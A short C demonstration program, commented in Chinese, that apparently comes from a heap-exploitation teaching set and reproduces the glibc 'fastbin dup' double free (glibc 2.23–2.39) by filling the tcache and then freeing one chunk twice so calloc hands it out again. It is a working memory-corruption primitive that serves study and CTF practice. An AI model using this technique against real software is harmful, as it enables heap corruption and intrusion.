/**
 *  漏洞名称：	fastbin dup
 *  适用版本：	glibc-2.23 ~ glibc-2.39
 *  漏洞危害：	实现fastbin的double free
 *  复现环境：	Ubuntu 22.04
 *  编译命令：	gcc -g fastbin_dup.c -o fastbin_dup
 */

/**
 *  利用条件：	存在double free
 *  利用思路:	先向fast bin中放入a, 再放入b, 再放入a即可实现fastbin的double free
 * 				注意，当存在tcache bin时需要先填充tcache bin
 */
#define DEMO
#include <demo.h>

int main()
{
	printf("1.创建7个chunk用于填充tcache bin\n");
	u64 tcache[7];
	for (int i = 0; i < 7; i++)
	{
		tcache[i] = MALLOC(0x10);
	}
	for (int i = 0; i < 7; i++)
	{
		FREE(tcache[i]);
	}

	printf("2.分配a和b\n");
	u64 a = (u64)calloc(1, 0x10);
	u64 b = (u64)calloc(1, 0x10);

	printf("3.释放a, 释放b, 释放a\n");
	FREE(a);
	FREE(b);
	FREE(a);

	u64 chunka = a - 0x10;
	u64 chunkb = b - 0x10;
	printf("此时状态: a(%p), b(%p)\n", (void *)chunka, (void *)chunkb);
	printf("fast bin: libc -> %p -> %p -> %p -> %p -> ...\n", (void *)chunka, (void *)chunkb, (void *)chunka, (void *)chunkb);

	printf("现在就实现了fastbin的double free:\n");
	printf("%p\n", calloc(1, 0x10));
	printf("%p\n", calloc(1, 0x10));
	printf("%p\n", calloc(1, 0x10));

	return 0;
}
